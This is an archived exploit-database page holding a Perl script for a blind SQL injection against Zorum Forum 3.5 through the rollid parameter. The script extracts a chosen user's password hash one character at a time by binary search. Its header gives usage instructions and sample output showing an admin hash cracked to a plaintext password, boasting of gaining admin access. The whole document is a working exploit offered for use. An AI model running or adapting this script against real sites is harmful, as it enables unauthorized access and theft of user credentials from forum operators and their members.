<html><head><title>Zorum Forum 3.5 (rollid) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

use LWP::UserAgent;

# -------------------------------------------------------------------------------------------
# Zorum forum (http://zorum.phpoutsourcing.com/) version 3.5 sql injection exploit
# by 1dt.w0lf // RusH security team
# *** work on all mysql versions
# -------------------------------------------------------------------------------------------
# Usage: r57zor.pl [path] [rollid] [username] 
# [path]     - path to forum
# [rollid]   - forum number where user create topic
# [username] - username for bruteforce
# -------------------------------------------------------------------------------------------
# screen:
# r57zor.pl http://zorum.phpoutsourcing.com/forum/ 4 admin
#  Please wait...
#  [################]
#
#  USER_NAME: admin
#  USER_PASS: 32b3956b2024e0fc
# -------------------------------------------------------------------------------------------  
# well it's just default sql crypting...
#  mysql_crk.exe 32b3956b2024e0fc
#  Hash: 32b3956b2024e0fc
#  Trying length 3
#  Trying length 4
#  Trying length 5
#  Trying length 6
#  Found pass: habzsi
# jabi-dabi-duuuu ... we are admins now... =)
# -------------------------------------------------------------------------------------------
# greets 2: GHC.ru , gst.void.ru
# -------------------------------------------------------------------------------------------
# 01.03.05


$path     = $ARGV[0];
$rollid   = $ARGV[1];
$username = $ARGV[2];

$s_num = 1;
$|++;

if (@ARGV &lt; 2) { &amp;usage; }
print &quot; Please wait...\r\n&quot;;
print &quot; [&quot;;

### quotes must die =)
($uusername = $username) =~ s/(.)/sprintf(&quot;%d,&quot;,ord($1))/eg;
$uusername =~ s/(.*),$/$1/;

while(1)
{
if(&amp;found(47,58)==0) { &amp;found(96,122); } 
$char = $i;
if ($char==&quot;0&quot;) 
 { 
 print qq{] 
 
 USER_NAME: $username
 USER_PASS: $allchar
 };
 exit(); 
 }
else 
 { 
 print &quot;#&quot;; 
 $allchar .= chr($char); 
 }
$s_num++;
}

sub found($$)
 {
 my $fmin = $_[0];
 my $fmax = $_[1];
 if (($fmax-$fmin)&lt;5) { $i=crack($fmin,$fmax); return $i; }
 
 $r = int($fmax - ($fmax-$fmin)/2);
 $check = &quot; BETWEEN $r AND $fmax&quot;;
 if ( &amp;check($check) ) { &amp;found($r,$fmax); }
 else { &amp;found($fmin,$r); }
 }
 
sub crack($$)
 {
 my $cmin = $_[0];
 my $cmax = $_[1];
 $i = $cmin;
 while ($i&lt;$cmax)
  {
  $crcheck = &quot;=$i&quot;;
  if ( &amp;check($crcheck) ) { return $i; }
  $i++;
  }
 $i = 0;
 return $i;
 }
 
sub check($)
 {
 $n++;
 $ccheck = $_[0];
 $http_query = $path.&quot;index.php?method=showhtmllist&amp;list=topic&amp;rollid=&quot;.$rollid.&quot; AND u.name=char(&quot;.$uusername.&quot;) AND ascii(substring(u.password,&quot;.$s_num.&quot;,1))&quot;.$ccheck.&quot; /*&quot;;
 $mcb_reguest = LWP::UserAgent-&gt;new() or die;
 $res = $mcb_reguest-&gt;post($http_query); 
 @results = $res-&gt;content; 
 
 #print &quot; HTTP QUERY : $http_query \r\n&quot;;
 
 foreach $result(@results)
  {
  if ($result =~ /details/) { return 1; }
  }
 return 0;
 }
 

sub usage()
 {
 print q( 
+-------------* Zorum sql injection exploit *--------------+
|                  r57 private stuff !!!                   |
|                   http://rst.void.ru                     |
|---* USAGE *----------------------------------------------|
| r57zor.pl [path] [rollid] [username]                     |
+--------------* view sources for more info *--------------+
 );
 exit();
 }

# milw0rm.com [2006-02-17]</pre></html>